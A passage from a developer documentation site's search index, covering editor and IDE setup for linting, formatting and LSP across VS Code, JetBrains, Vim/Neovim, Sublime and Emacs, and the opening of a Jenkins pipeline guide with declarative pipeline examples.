]\n}\n</code></pre>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#vs-code-launch-configuration","title":"VS Code Launch Configuration","text":"<p>.vscode/launch.json:</p> <pre><code>{\n  \"version\": \"0.2.0\",\n  \"configurations\": [\n    {\n      \"name\": \"Python: Current File\",\n      \"type\": \"python\",\n      \"request\": \"launch\",\n      \"program\": \"${file}\",\n      \"console\": \"integratedTerminal\",\n      \"justMyCode\": true\n    },\n    {\n      \"name\": \"Python: pytest\",\n      \"type\": \"python\",\n      \"request\": \"launch\",\n      \"module\": \"pytest\",\n      \"args\": [\"tests/\", \"-v\"],\n      \"console\": \"integratedTerminal\",\n      \"justMyCode\": false\n    },\n    {\n      \"name\": \"Node: Current File\",\n      \"type\": \"node\",\n      \"request\": \"launch\",\n      \"program\": \"${file}\",\n      \"skipFiles\": [\"&lt;node_internals&gt;/**\"]\n    },\n    {\n      \"name\": \"Jest: Current File\",\n      \"type\": \"node\",\n      \"request\": \"launch\",\n      \"program\": \"${workspaceFolder}/node_modules/.bin/jest\",\n      \"args\": [\"${fileBasenameNoExtension}\", \"--config\", \"jest.config.js\"],\n      \"console\": \"integratedTerminal\",\n      \"internalConsoleOptions\": \"neverOpen\"\n    }\n  ]\n}\n</code></pre>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#jetbrains-ides","title":"JetBrains IDEs","text":"","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#pycharm","title":"PyCharm","text":"<p>Initial Setup:</p> <ol> <li>Install PyCharm (Professional or Community)</li> <li>Open project</li> <li>Configure Python interpreter: Settings &gt; Project &gt; Python Interpreter</li> <li>Select or create virtual environment</li> </ol> <p>Configure Black:</p> <ol> <li>Settings &gt; Tools &gt; Black</li> <li>Enable: \u2713</li> <li>Arguments: <code>--line-length 120</code></li> <li>On code reformat: \u2713</li> <li>On save: \u2713 (optional)</li> </ol> <p>Configure isort:</p> <ol> <li>Settings &gt; Tools &gt; File Watchers</li> <li>Click + &gt; Custom</li> <li>Name: isort</li> <li>File type: Python</li> <li>Program: <code>$PyInterpreterDirectory$/isort</code></li> <li>Arguments: <code>$FilePath$ --profile black</code></li> <li>Working directory: <code>$ProjectFileDir$</code></li> </ol> <p>Configure flake8:</p> <ol> <li>Settings &gt; Tools &gt; External Tools</li> <li>Click +</li> <li>Name: flake8</li> <li>Program: <code>$PyInterpreterDirectory$/flake8</code></li> <li>Arguments: <code>$FilePath$ --max-line-length=120</code></li> <li>Working directory: <code>$ProjectFileDir$</code></li> </ol> <p>Configure mypy:</p> <ol> <li>Settings &gt; Tools &gt; External Tools</li> <li>Click +</li> <li>Name: mypy</li> <li>Program: <code>$PyInterpreterDirectory$/mypy</code></li> <li>Arguments: <code>$FilePath$ --ignore-missing-imports</code></li> <li>Working directory: <code>$ProjectFileDir$</code></li> </ol> <p>Enable Pylint plugin:</p> <ol> <li>Settings &gt; Plugins</li> <li>Search \"Pylint\"</li> <li>Install and restart</li> <li>Settings &gt; Pylint &gt; Path to executable: Select <code>pylint</code> from venv</li> </ol> <p>Testing configuration:</p> <ol> <li>Settings &gt; Tools &gt; Python Integrated Tools</li> <li>Default test runner: pytest</li> <li>pytest arguments: <code>-v --cov=src</code></li> </ol>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#webstormintellij-idea","title":"WebStorm/IntelliJ IDEA","text":"<p>Configure Prettier:</p> <ol> <li>Settings &gt; Languages &amp; Frameworks &gt; JavaScript &gt; Prettier</li> <li>Prettier package: <code>./node_modules/prettier</code></li> <li>Run on save: \u2713</li> <li>Files pattern: <code>{**/*,*}.{js,ts,jsx,tsx,json,css,scss,md}</code></li> </ol> <p>Configure ESLint:</p> <ol> <li>Settings &gt; Languages &amp; Frameworks &gt; JavaScript &gt; Code Quality Tools &gt; ESLint</li> <li>Automatic ESLint configuration: \u2713</li> <li>Run eslint --fix on save: \u2713</li> </ol> <p>Configure TypeScript:</p> <ol> <li>Settings &gt; Languages &amp; Frameworks &gt; TypeScript</li> <li>TypeScript language service: \u2713</li> <li>Recompile on changes: \u2713</li> <li>Service directory: <code>./node_modules/typescript</code></li> </ol> <p>File Watchers for Auto-formatting:</p> <ol> <li>Settings &gt; Tools &gt; File Watchers</li> <li>Add Prettier watcher:</li> <li>File type: JavaScript / TypeScript</li> <li>Program: <code>$ProjectFileDir$/node_modules/.bin/prettier</code></li> <li>Arguments: <code>--write $FilePath$</code></li> <li>Output paths: <code>$FilePath$</code></li> </ol>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#intellij-idea-terraform","title":"IntelliJ IDEA (Terraform)**","text":"<ol> <li>Install HashiCorp Terraform plugin</li> <li>Settings &gt; Languages &amp; Frameworks &gt; Terraform</li> <li>Enable Terraform tools: \u2713</li> <li>Terraform executable: <code>/usr/local/bin/terraform</code></li> <li>Format on save: \u2713</li> </ol>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#common-jetbrains-settings","title":"Common JetBrains Settings","text":"<p>EditorConfig Support:</p> <ol> <li>Settings &gt; Editor &gt; Code Style</li> <li>Enable EditorConfig support: \u2713</li> </ol> <p>File encoding:</p> <ol> <li>Settings &gt; Editor &gt; File Encodings</li> <li>Global Encoding: UTF-8</li> <li>Project Encoding: UTF-8</li> <li>Default encoding for properties files: UTF-8</li> </ol> <p>Line separators:</p> <ol> <li>Settings &gt; Editor &gt; Code Style</li> <li>Line separator: Unix and macOS (\\n)</li> </ol> <p>Inspections:</p> <ol> <li>Settings &gt; Editor &gt; Inspections</li> <li>Enable relevant language inspections</li> <li>Set severity levels</li> </ol>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#vimneovim","title":"Vim/Neovim","text":"","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#neovim-setup-with-lsp","title":"Neovim Setup with LSP","text":"<p>Install Neovim:</p> <pre><code>## macOS\nbrew install neovim\n\n## Ubuntu/Debian\nsudo apt install neovim\n\n## Verify\nnvim --version\n</code></pre> <p>Install plugin manager (lazy.nvim):</p> <pre><code>-- ~/.config/nvim/init.lua\nlocal lazypath = vim.fn.stdpath(\"data\") .. \"/lazy/lazy.nvim\"\nif not vim.loop.fs_stat(lazypath) then\n  vim.fn.system({\n    \"git\",\n    \"clone\",\n    \"--filter=blob:none\",\n    \"https://github.com/folke/lazy.nvim.git\",\n    \"--branch=stable\",\n    lazypath,\n  })\nend\nvim.opt.rtp:prepend(lazypath)\n\nrequire(\"lazy\").setup({\n  -- LSP\n  \"neovim/nvim-lspconfig\",\n  \"williamboman/mason.nvim\",\n  \"williamboman/mason-lspconfig.nvim\",\n\n  -- Autocompletion\n  \"hrsh7th/nvim-cmp\",\n  \"hrsh7th/cmp-nvim-lsp\",\n  \"hrsh7th/cmp-buffer\",\n  \"hrsh7th/cmp-path\",\n  \"L3MON4D3/LuaSnip\",\n\n  -- Formatting\n  \"jose-elias-alvarez/null-ls.nvim\",\n\n  -- Syntax highlighting\n  { \"nvim-treesitter/nvim-treesitter\", build = \":TSUpdate\" },\n\n  -- File explorer\n  \"nvim-tree/nvim-tree.lua\",\n  \"nvim-tree/nvim-web-devicons\",\n\n  -- Fuzzy finder\n  {\n    \"nvim-telescope/telescope.nvim\",\n    dependencies = { \"nvim-lua/plenary.nvim\" }\n  },\n\n  -- Git\n  \"lewis6991/gitsigns.nvim\",\n\n  -- Status line\n  \"nvim-lualine/lualine.nvim\",\n\n  -- Color scheme\n  \"folke/tokyonight.nvim\",\n})\n</code></pre> <p>LSP Configuration:</p> <pre><code>-- ~/.config/nvim/lua/lsp.lua\nlocal lspconfig = require(\"lspconfig\")\nlocal capabilities = require(\"cmp_nvim_lsp\").default_capabilities()\n\n-- Python\nlspconfig.pyright.setup({\n  capabilities = capabilities,\n  settings = {\n    python = {\n      analysis = {\n        typeCheckingMode = \"basic\",\n        autoSearchPaths = true,\n        useLibraryCodeForTypes = true,\n      }\n    }\n  }\n})\n\n-- TypeScript\nlspconfig.tsserver.setup({\n  capabilities = capabilities,\n})\n\n-- Terraform\nlspconfig.terraformls.setup({\n  capabilities = capabilities,\n})\n\n-- Lua\nlspconfig.lua_ls.setup({\n  capabilities = capabilities,\n  settings = {\n    Lua = {\n      diagnostics = {\n        globals = { \"vim\" }\n      }\n    }\n  }\n})\n\n-- Bash\nlspconfig.bashls.setup({\n  capabilities = capabilities,\n})\n\n-- YAML\nlspconfig.yamlls.setup({\n  capabilities = capabilities,\n  settings = {\n    yaml = {\n      schemas = {\n        [\"https://json.schemastore.org/github-workflow.json\"] = \"/.github/workflows/*\"\n      }\n    }\n  }\n})\n</code></pre> <p>Null-ls for Formatting and Linting:</p> <pre><code>-- ~/.config/nvim/lua/null-ls-config.lua\nlocal null_ls = require(\"null-ls\")\n\nnull_ls.setup({\n  sources = {\n    -- Python\n    null_ls.builtins.formatting.black.with({\n      extra_args = { \"--line-length=120\" }\n    }),\n    null_ls.builtins.formatting.isort.with({\n      extra_args = { \"--profile=black\" }\n    }),\n    null_ls.builtins.diagnostics.flake8.with({\n      extra_args = { \"--max-line-length=120\" }\n    }),\n    null_ls.builtins.diagnostics.mypy,\n\n    -- JavaScript/TypeScript\n    null_ls.builtins.formatting.prettier,\n    null_ls.builtins.diagnostics.eslint,\n\n    -- Terraform\n    null_ls.builtins.formatting.terraform_fmt,\n\n    -- Shell\n    null_ls.builtins.formatting.shfmt.with({\n      extra_args = { \"-i\", \"2\", \"-ci\" }\n    }),\n    null_ls.builtins.diagnostics.shellcheck,\n\n    -- YAML\n    null_ls.builtins.diagnostics.yamllint,\n\n    -- Markdown\n    null_ls.builtins.diagnostics.markdownlint,\n  },\n  on_attach = function(client, bufnr)\n    if client.supports_method(\"textDocument/formatting\") then\n      vim.api.nvim_create_autocmd(\"BufWritePre\", {\n        buffer = bufnr,\n        callback = function()\n          vim.lsp.buf.format({ bufnr = bufnr })\n        end,\n      })\n    end\n  end,\n})\n</code></pre> <p>Key Mappings:</p> <pre><code>-- ~/.config/nvim/lua/keymaps.lua\nlocal opts = { noremap = true, silent = true }\n\n-- LSP keymaps\nvim.keymap.set('n', 'gd', vim.lsp.buf.definition, opts)\nvim.keymap.set('n', 'K', vim.lsp.buf.hover, opts)\nvim.keymap.set('n', 'gi', vim.lsp.buf.implementation, opts)\nvim.keymap.set('n', '&lt;leader&gt;rn', vim.lsp.buf.rename, opts)\nvim.keymap.set('n', '&lt;leader&gt;ca', vim.lsp.buf.code_action, opts)\nvim.keymap.set('n', 'gr', vim.lsp.buf.references, opts)\n\n-- Format\nvim.keymap.set('n', '&lt;leader&gt;f', vim.lsp.buf.format, opts)\n\n-- Diagnostics\nvim.keymap.set('n', '&lt;leader&gt;e', vim.diagnostic.open_float, opts)\nvim.keymap.set('n', '[d', vim.diagnostic.goto_prev, opts)\nvim.keymap.set('n', ']d', vim.diagnostic.goto_next, opts)\n</code></pre>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#vim-classic-with-ale","title":"Vim (Classic) with ALE","text":"<p>Install Vim-Plug:</p> <pre><code>curl -fLo ~/.vim/autoload/plug.vim --create-dirs \\\n    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\n</code></pre> <p>.vimrc:</p> <pre><code>call plug#begin('~/.vim/plugged')\n\n\" Linting and fixing\nPlug 'dense-analysis/ale'\n\n\" Autocompletion\nPlug 'ycm-core/YouCompleteMe', { 'do': './install.py' }\n\n\" File explorer\nPlug 'preservim/nerdtree'\n\n\" Fuzzy finder\nPlug 'junegunn/fzf', { 'do': { -&gt; fzf#install() } }\nPlug 'junegunn/fzf.vim'\n\n\" Git\nPlug 'tpope/vim-fugitive'\n\n\" Status line\nPlug 'vim-airline/vim-airline'\n\n\" Color scheme\nPlug 'morhetz/gruvbox'\n\ncall plug#end()\n\n\" ALE configuration\nlet g:ale_linters = {\n\\   'python': ['flake8', 'mypy', 'pylint'],\n\\   'javascript': ['eslint'],\n\\   'typescript': ['eslint', 'tsserver'],\n\\   'terraform': ['tflint'],\n\\   'sh': ['shellcheck'],\n\\   'yaml': ['yamllint'],\n\\}\n\nlet g:ale_fixers = {\n\\   'python': ['black', 'isort'],\n\\   'javascript': ['prettier', 'eslint'],\n\\   'typescript': ['prettier', 'eslint'],\n\\   'terraform': ['terraform'],\n\\   'sh': ['shfmt'],\n\\   'yaml': ['prettier'],\n\\   '*': ['remove_trailing_lines', 'trim_whitespace'],\n\\}\n\nlet g:ale_fix_on_save = 1\nlet g:ale_python_black_options = '--line-length 120'\nlet g:ale_python_isort_options = '--profile black'\nlet g:ale_python_flake8_options = '--max-line-length=120'\n\n\" Color scheme\ncolorscheme gruvbox\nset background=dark\n\n\" General settings\nset number\nset relativenumber\nset tabstop=2\nset shiftwidth=2\nset expandtab\nset autoindent\nset smartindent\n</code></pre>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#sublime-text","title":"Sublime Text","text":"<p>Install Package Control:</p> <ol> <li>Open Sublime Text</li> <li>Press <code>Ctrl+Shift+P</code> (or <code>Cmd+Shift+P</code> on macOS)</li> <li>Type \"Install Package Control\"</li> <li>Select and execute</li> </ol> <p>Install Packages:</p> <ol> <li><code>Ctrl+Shift+P</code> &gt; \"Package Control: Install Package\"</li> <li>Install the following:</li> <li>LSP</li> <li>LSP-pyright</li> <li>LSP-typescript</li> <li>LSP-terraform</li> <li>SublimeLinter</li> <li>SublimeLinter-flake8</li> <li>SublimeLinter-eslint</li> <li>JsPrettier</li> <li>Terraform</li> </ol> <p>LSP Settings:</p> <p>Preferences &gt; Package Settings &gt; LSP &gt; Settings:</p> <pre><code>{\n  \"clients\": {\n    \"pyright\": {\n      \"enabled\": true,\n      \"command\": [\"pyright-langserver\", \"--stdio\"],\n      \"selector\": \"source.python\"\n    },\n    \"typescript\": {\n      \"enabled\": true,\n      \"command\": [\"typescript-language-server\", \"--stdio\"],\n      \"selector\": \"source.ts | source.tsx | source.js | source.jsx\"\n    }\n  }\n}\n</code></pre> <p>User Settings:</p> <p>Preferences &gt; Settings:</p> <pre><code>{\n  \"translate_tabs_to_spaces\": true,\n  \"tab_size\": 2,\n  \"rulers\": [120],\n  \"trim_trailing_white_space_on_save\": true,\n  \"ensure_newline_at_eof_on_save\": true,\n  \"default_line_ending\": \"unix\"\n}\n</code></pre>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#emacs","title":"Emacs","text":"<p>Install Emacs:</p> <pre><code>## macOS\nbrew install --cask emacs\n\n## Ubuntu/Debian\nsudo apt install emacs\n</code></pre> <p>Install use-package:</p> <p>Add to <code>~/.emacs.d/init.el</code>:</p> <pre><code>;; Initialize package sources\n(require 'package)\n(setq package-archives '((\"melpa\" . \"https://melpa.org/packages/\")\n                         (\"org\" . \"https://orgmode.org/elpa/\")\n                         (\"elpa\" . \"https://elpa.gnu.org/packages/\")))\n(package-initialize)\n(unless package-archive-contents\n  (package-refresh-contents))\n\n;; Install use-package\n(unless (package-installed-p 'use-package)\n  (package-install 'use-package))\n(require 'use-package)\n(setq use-package-always-ensure t)\n</code></pre> <p>LSP Mode:</p> <pre><code>;; LSP Mode\n(use-package lsp-mode\n  :init\n  (setq lsp-keymap-prefix \"C-c l\")\n  :hook ((python-mode . lsp)\n         (typescript-mode . lsp)\n         (terraform-mode . lsp)\n         (sh-mode . lsp))\n  :commands lsp)\n\n(use-package lsp-ui :commands lsp-ui-mode)\n(use-package company :config (global-company-mode))\n(use-package flycheck :config (global-flycheck-mode))\n\n;; Python\n(use-package python-mode)\n(use-package py-autopep8\n  :hook (python-mode . py-autopep8-mode))\n\n;; TypeScript\n(use-package typescript-mode)\n\n;; Terraform\n(use-package terraform-mode)\n\n;; YAML\n(use-package yaml-mode)\n\n;; Markdown\n(use-package markdown-mode)\n\n;; Git\n(use-package magit)\n\n;; Project management\n(use-package projectile\n  :config\n  (projectile-mode +1)\n  (define-key projectile-mode-map (kbd \"C-c p\") 'projectile-command-map))\n</code></pre>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#remote-development","title":"Remote Development","text":"","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#vs-code-remote-ssh","title":"VS Code Remote SSH","text":"<p>Install extension:</p> <pre><code>code --install-extension ms-vscode-remote.remote-ssh\n</code></pre> <p>Configure SSH:</p> <p><code>~/.ssh/config</code>:</p> <pre><code>Host dev-server\n    HostName dev.example.com\n    User yourusername\n    IdentityFile ~/.ssh/id_rsa\n    ForwardAgent yes\n</code></pre> <p>Connect:</p> <ol> <li>Press <code>Cmd+Shift+P</code> / <code>Ctrl+Shift+P</code></li> <li>Type \"Remote-SSH: Connect to Host\"</li> <li>Select your configured host</li> <li>Open folder on remote server</li> <li>Extensions are installed on remote automatically</li> </ol>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#jetbrains-gateway","title":"JetBrains Gateway","text":"<ol> <li>Download JetBrains Gateway</li> <li>New Connection &gt; SSH</li> <li>Enter host details</li> <li>Select IDE (PyCharm, WebStorm, etc.)</li> <li>Gateway handles remote development</li> </ol>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#docker-development","title":"Docker Development","text":"<p>VS Code Dev Containers:</p> <pre><code>code --install-extension ms-vscode-remote.remote-containers\n</code></pre> <p>.devcontainer/devcontainer.json:</p> <pre><code>{\n  \"name\": \"Python Dev Container\",\n  \"image\": \"mcr.microsoft.com/devcontainers/python:3.11\",\n  \"customizations\": {\n    \"vscode\": {\n      \"extensions\": [\n        \"ms-python.python\",\n        \"ms-python.black-formatter\",\n        \"ms-python.flake8\",\n        \"ms-python.mypy-type-checker\"\n      ],\n      \"settings\": {\n        \"python.defaultInterpreterPath\": \"/usr/local/bin/python\",\n        \"python.formatting.provider\": \"black\"\n      }\n    }\n  },\n  \"postCreateCommand\": \"pip install -e .[dev]\",\n  \"remoteUser\": \"vscode\"\n}\n</code></pre>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#performance-optimization","title":"Performance Optimization","text":"","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#vs-code-performance","title":"VS Code Performance","text":"<p>Disable unused extensions:</p> <pre><code>## List installed extensions\ncode --list-extensions\n\n## Disable specific extension\ncode --disable-extension &lt;extension-id&gt;\n</code></pre> <p>settings.json optimizations:</p> <pre><code>{\n  \"files.watcherExclude\": {\n    \"**/.git/objects/**\": true,\n    \"**/node_modules/**\": true,\n    \"**/.venv/**\": true,\n    \"**/__pycache__/**\": true,\n    \"**/dist/**\": true,\n    \"**/build/**\": true\n  },\n  \"search.followSymlinks\": false,\n  \"search.useIgnoreFiles\": true,\n  \"typescript.disableAutomaticTypeAcquisition\": false,\n  \"extensions.autoUpdate\": false\n}\n</code></pre>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#jetbrains-performance","title":"JetBrains Performance","text":"<ol> <li>Settings &gt; Appearance &amp; Behavior &gt; System Settings</li> <li>Increase memory heap: <code>-Xmx4096m</code></li> <li>Disable unused plugins</li> <li>Exclude directories from indexing:</li> <li>Settings &gt; Project &gt; Directories</li> <li>Mark <code>node_modules</code>, <code>.venv</code>, <code>dist</code> as Excluded</li> </ol>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#neovim-performance","title":"Neovim Performance","text":"<pre><code>-- Disable unused providers\nvim.g.loaded_perl_provider = 0\nvim.g.loaded_ruby_provider = 0\nvim.g.loaded_node_provider = 0\n\n-- Faster update time\nvim.opt.updatetime = 300\n\n-- Limit syntax highlighting\nvim.opt.synmaxcol = 200\n</code></pre>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#resources","title":"Resources","text":"<ul> <li>VS Code Documentation</li> <li>JetBrains IDEs</li> <li>Neovim Documentation</li> <li>LSP Specification</li> </ul> <p>Next Steps:</p> <ul> <li>Review the Local Validation Setup for tool installation</li> <li>See Pre-commit Hooks Guide for automated validation</li> <li>Check AI Validation Pipeline for CI/CD integration</li> </ul>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/jenkins_pipeline_guide/","title":"Jenkins Pipeline Guide","text":"","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#introduction","title":"Introduction","text":"<p>This guide provides comprehensive patterns and best practices for building production-grade CI/CD pipelines with Jenkins. It covers declarative and scripted pipeline syntax, shared libraries, deployment strategies, security integration, and performance optimization.</p>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#table-of-contents","title":"Table of Contents","text":"<ol> <li>Pipeline Fundamentals</li> <li>Declarative Pipeline Patterns</li> <li>Full-Stack Application Pipeline</li> <li>Deployment Strategies</li> <li>Shared Libraries</li> <li>Security Integration</li> <li>Testing Strategies</li> <li>Performance Optimization</li> <li>Multi-Branch Pipelines</li> <li>Advanced Patterns</li> </ol>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#pipeline-fundamentals","title":"Pipeline Fundamentals","text":"","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#declarative-vs-scripted-pipelines","title":"Declarative vs Scripted Pipelines","text":"<p>Declarative Pipeline (Recommended for most use cases):</p> <pre><code>pipeline {\n    agent any\n\n    stages {\n        stage('Build') {\n            steps {\n                sh 'make build'\n            }\n        }\n    }\n}\n</code></pre> <p>Scripted Pipeline (For complex logic):</p> <pre><code>node {\n    stage('Build') {\n        sh 'make build'\n    }\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#best-practices-for-pipeline-structure","title":"Best Practices for Pipeline Structure","text":"<ol> <li>Use Declarative Syntax: More structured, easier to read, built-in error handling</li> <li>Define Agent at Stage Level: Allow different stages to run on different agents</li> <li>Use Environment Variables: Centralize configuration</li> <li>Implement Timeouts: Prevent hung builds</li> <li>Add Post Actions: Always cleanup, notify on failure</li> </ol>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#basic-declarative-pipeline-template","title":"Basic Declarative Pipeline Template","text":"<pre><code>pipeline {\n    agent none\n\n    options {\n        buildDiscarder(logRotator(numToKeepStr: '10'))\n        timeout(time: 1, unit: 'HOURS')\n        disableConcurrentBuilds()\n        timestamps()\n    }\n\n    environment {\n        // Global environment variables\n        PROJECT_NAME = 'my-app'\n        DOCKER_REGISTRY = 'docker.io/myorg'\n    }\n\n    stages {\n        stage('Checkout') {\n            agent any\n            steps {\n                checkout scm\n            }\n        }\n\n        stage('Build') {\n            agent {\n                docker {\n                    image 'node:20-alpine'\n                    reuseNode true\n                }\n            }\n            steps {\n                sh 'npm ci'\n                sh 'npm run build'\n            }\n        }\n\n        stage('Test') {\n            agent {\n                docker {\n                    image 'node:20-alpine'\n                    reuseNode true\n                }\n            }\n            steps {\n                sh 'npm test'\n            }\n        }\n    }\n\n    post {\n        always {\n            cleanWs()\n        }\n        success {\n            echo 'Pipeline succeeded!'\n        }\n        failure {\n            echo 'Pipeline failed!'\n        }\n    }\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#declarative-pipeline-patterns","title":"Declarative Pipeline Patterns","text":"","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#parallel-execution","title":"Parallel Execution","text":"<pre><code>pipeline {\n    agent any\n\n    stages {\n        stage('Parallel Tests') {\n            parallel {\n                stage('Unit Tests') {\n                    agent {\n                        docker { image 'node:20-alpine' }\n                    }\n                    steps {\n                        sh 'npm run test:unit'\n                    }\n                }\n\n                stage('Integration Tests') {\n                    agent {\n                        docker { image 'node:20-alpine' }\n                    }\n                    steps {\n                        sh 'npm run test:integration'\n                    }\n                }\n\n                stage('Lint') {\n                    agent {\n                        docker { image 'node:20-alpine' }\n                    }\n                    steps {\n                        sh 'npm run lint'\n                    }\n                }\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#matrix-builds","title":"Matrix Builds","text":"<pre><code>pipeline {\n    agent none\n\n    stages {\n        stage('Test Multiple Versions') {\n            matrix {\n                axes {\n                    axis {\n                        name 'NODE_VERSION'\n                        values '18', '20', '22'\n                    }\n                    axis {\n                        name 'OS'\n                        values 'linux', 'windows'\n                    }\n                }\n                excludes {\n                    exclude {\n                        axis {\n                            name 'NODE_VERSION'\n                            values '18'\n                        }\n                        axis {\n                            name 'OS'\n                            values 'windows'\n                        }\n                    }\n                }\n                agent {\n                    docker {\n                        image \"node:${NODE_VERSION}-alpine\"\n                    }\n                }\n                stages {\n                    stage('Test') {\n                        steps {\n                            sh 'npm ci'\n                            sh 'npm test'\n                        }\n                    }\n                }\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#conditional-execution","title":"Conditional Execution","text":"<pre><code>pipeline {\n    agent any\n\n    stages {\n        stage('Deploy to Staging') {\n            when {\n                branch 'develop'\n            }\n            steps {\n                sh './deploy-staging.sh'\n            }\n        }\n\n        stage('Deploy to Production') {\n            when {\n                allOf {\n                    branch 'main'\n                    expression {\n                        currentBuild.result == null || currentBuild.result == 'SUCCESS'\n                    }\n                }\n            }\n            steps {\n                input message: 'Deploy to production?', ok: 'Deploy'\n                sh './deploy-production.sh'\n            }\n        }\n\n        stage('Build Docker Image') {\n            when {\n                anyOf {\n                    branch 'main'\n                    branch 'develop'\n                    changeRequest()\n                }\n            }\n            steps {\n                sh 'docker build -t myapp:${GIT_COMMIT} .'\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#using-credentials","title":"Using Credentials","text":"<pre><code>pipeline {\n    agent any\n\n    environment {\n        // Username/Password credential\n        DOCKER_CREDS = credentials('docker-hub-credentials')\n\n        // Secret text credential\n        API_KEY = credentials('api-key')\n\n        // SSH key credential\n        SSH_KEY = credentials('deploy-ssh-key')\n    }\n\n    stages {\n        stage('Docker Login') {\n            steps {\n                sh '''\n                    echo $DOCKER_CREDS_PSW | docker login -u $DOCKER_CREDS_USR --password-stdin\n                '''\n            }\n        }\n\n        stage('Use API Key') {\n            steps {\n                sh '''\n                    curl -H \"Authorization: Bearer ${API_KEY}\" https://api.example.com\n                '''\n            }\n        }\n\n        stage('SSH Deploy') {\n            steps {\n                sshagent(['deploy-ssh-key']) {\n                    sh '''\n                        ssh user@server 'bash -s' &lt; deploy.sh\n                    '''\n                }\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#full-stack-application-pipeline","title":"Full-Stack Application Pipeline","text":"","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#complete-nodejs-python-pipeline","title":"Complete Node.js + Python Pipeline","text":"<pre><code>pipeline {\n    agent none\n\n    options {\n        buildDiscarder(logRotator(numToKeepStr: '30'))\n        timeout(time: 1, unit: 'HOURS')\n        disableConcurrentBuilds()\n        timestamps()\n    }\n\n    environment {\n        DOCKER_REGISTRY = 'docker.io/myorg'\n        DOCKER_CREDS = credentials('docker-hub-credentials')\n        AWS_CREDS = credentials('aws-credentials')\n        SLACK_CHANNEL = '#deployments'\n    }\n\n    stages {\n        stage('Checkout') {\n            agent any\n            steps {\n                checkout scm\n                script {\n                    env.GIT_COMMIT_SHORT = sh(\n                        script: \"git rev-parse --short HEAD\",\n                        returnStdout: true\n                    ).trim()\n                }\n            }\n        }\n\n        stage('Parallel Lint &amp; Format Check') {\n            parallel {\n                stage('Frontend Lint') {\n                    agent {\n                        docker {\n                            image 'node:20-alpine'\n                            reuseNode true\n                        }\n                    }\n                    steps {\n                        dir('frontend') {\n                            sh 'npm ci'\n                            sh 'npm run lint'\n                            sh 'npm run format:check'\n                        }\n                    }\n                }\n\n                stage('Backend Lint') {\n                    agent {\n                        docker 